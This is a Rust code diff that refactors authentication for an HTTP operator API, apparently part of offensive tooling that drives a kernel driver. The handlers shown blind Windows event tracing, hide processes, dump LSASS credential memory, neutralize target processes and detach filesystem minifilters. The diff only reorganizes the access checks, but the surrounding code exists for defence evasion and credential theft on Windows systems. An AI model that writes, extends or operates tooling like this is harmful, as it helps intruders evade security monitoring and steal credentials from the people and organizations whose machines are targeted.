@@ -6,7 +6,6 @@
 
 use axum::{
     extract::{Query, State},
-    http::HeaderMap,
     response::{IntoResponse, Response},
     Json,
 };
@@ -178,21 +177,16 @@ impl KernelBridge {
 }
 
 // ---- Auth helper ----
+/// RBAC gate for kernel ops: the caller is already authenticated by the
+/// [`crate::AuthOp`] extractor (401 before any query parsing); here we only
+/// enforce that kernel control is Admin-only.
 fn gate(
-    st: &crate::AppState,
-    headers: &HeaderMap,
+    op: operators::OperatorIdentity,
 ) -> Result<operators::OperatorIdentity, (axum::http::StatusCode, &'static str)> {
-    match crate::authenticate(st, headers) {
-        crate::AuthOutcome::Allowed(op) => {
-            if op.role != operators::Role::Admin {
-                return Err((axum::http::StatusCode::FORBIDDEN, "admin required"));
-            }
-            Ok(op)
-        }
-        crate::AuthOutcome::Denied(_) => {
-            Err((axum::http::StatusCode::UNAUTHORIZED, "auth required"))
-        }
+    if op.role != operators::Role::Admin {
+        return Err((axum::http::StatusCode::FORBIDDEN, "admin required"));
     }
+    Ok(op)
 }
 
 // ---- Query params ----
@@ -207,7 +201,7 @@ pub struct NeutQ {
 }
 
 // ---- Handler dispatch helper ----
-/// Shared kernel dispatch: gate → resolve bridge.
+/// Shared kernel dispatch: RBAC gate → resolve bridge.
 ///
 /// Returns the bridge + the authenticated operator on success, or an error
 /// `Response` to return early. The audit record is NOT written here — each
@@ -217,7 +211,7 @@ pub struct NeutQ {
 /// error outcome (otherwise a misconfigured daemon would vanish from the log).
 async fn kernel_dispatch<'a>(
     st: &'a std::sync::Arc<crate::AppState>,
-    headers: &HeaderMap,
+    op: operators::OperatorIdentity,
     audit_action: &str,
     audit_details: &str,
     audit_data: serde_json::Value,
@@ -228,7 +222,7 @@ async fn kernel_dispatch<'a>(
     ),
     Response,
 > {
-    let op = match gate(st, headers) {
+    let op = match gate(op) {
         Ok(o) => o,
         Err((code, msg)) => return Err((code, msg).into_response()),
     };
@@ -276,20 +270,13 @@ fn audit_kernel_outcome(
 
 pub async fn driver_status(
     State(st): State<std::sync::Arc<crate::AppState>>,
-    headers: HeaderMap,
+    crate::AuthOp(op): crate::AuthOp,
 ) -> Response {
-    let (bridge, op) = match kernel_dispatch(
-        &st,
-        &headers,
-        "kernel_driver_status",
-        "-",
-        serde_json::json!({}),
-    )
-    .await
-    {
-        Ok(t) => t,
-        Err(r) => return r,
-    };
+    let (bridge, op) =
+        match kernel_dispatch(&st, op, "kernel_driver_status", "-", serde_json::json!({})).await {
+            Ok(t) => t,
+            Err(r) => return r,
+        };
     let result = bridge.send_op("ping", None, None).await;
     if let Some(audit) = &st.audit {
         audit_kernel_outcome(
@@ -309,20 +296,13 @@ pub async fn driver_status(
 
 pub async fn blind_etw(
     State(st): State<std::sync::Arc<crate::AppState>>,
-    headers: HeaderMap,
+    crate::AuthOp(op): crate::AuthOp,
 ) -> Response {
-    let (bridge, op) = match kernel_dispatch(
-        &st,
-        &headers,
-        "kernel_blind_etw",
-        "-",
-        serde_json::json!({}),
-    )
-    .await
-    {
-        Ok(t) => t,
-        Err(r) => return r,
-    };
+    let (bridge, op) =
+        match kernel_dispatch(&st, op, "kernel_blind_etw", "-", serde_json::json!({})).await {
+            Ok(t) => t,
+            Err(r) => return r,
+        };
     let result = bridge.send_op("blind-etw", None, None).await;
     if let Some(audit) = &st.audit {
         audit_kernel_outcome(
@@ -342,22 +322,15 @@ pub async fn blind_etw(
 
 pub async fn hide(
     State(st): State<std::sync::Arc<crate::AppState>>,
-    headers: HeaderMap,
+    crate::AuthOp(op): crate::AuthOp,
     Query(q): Query<PidQ>,
 ) -> Response {
     let details = format!("pid:{}", q.pid);
-    let (bridge, op) = match kernel_dispatch(
-        &st,
-        &headers,
-        "kernel_hide",
-        &details,
-        serde_json::json!({}),
-    )
-    .await
-    {
-        Ok(t) => t,
-        Err(r) => return r,
-    };
+    let (bridge, op) =
+        match kernel_dispatch(&st, op, "kernel_hide", &details, serde_json::json!({})).await {
+            Ok(t) => t,
+            Err(r) => return r,
+        };
     let result = bridge.send_op("hide", Some(q.pid), None).await;
     if let Some(audit) = &st.audit {
         audit_kernel_outcome(
@@ -377,13 +350,13 @@ pub async fn hide(
 
 pub async fn dump_lsass(
     State(st): State<std::sync::Arc<crate::AppState>>,
-    headers: HeaderMap,
+    crate::AuthOp(op): crate::AuthOp,
     Query(q): Query<PidQ>,
 ) -> Response {
     let details = format!("pid:{}", q.pid);
     let (bridge, op) = match kernel_dispatch(
         &st,
-        &headers,
+        op,
         "kernel_dump_lsass",
         &details,
         serde_json::json!({}),
@@ -412,13 +385,13 @@ pub async fn dump_lsass(
 
 pub async fn neutralize(
     State(st): State<std::sync::Arc<crate::AppState>>,
-    headers: HeaderMap,
+    crate::AuthOp(op): crate::AuthOp,
     Query(q): Query<NeutQ>,
 ) -> Response {
     let details = format!("pid:{}", q.pid);
     let (bridge, op) = match kernel_dispatch(
         &st,
-        &headers,
+        op,
         "kernel_neutralize",
         &details,
         serde_json::json!({ "method": q.method }),
@@ -459,11 +432,11 @@ pub async fn neutralize(
 
 pub async fn detach_minifilter(
     State(st): State<std::sync::Arc<crate::AppState>>,
-    headers: HeaderMap,
+    crate::AuthOp(op): crate::AuthOp,
 ) -> Response {
     let (bridge, op) = match kernel_dispatch(
         &st,
-        &headers,
+        op,
         "kernel_detach_minifilter",
         "-",
         serde_json::json!({}),
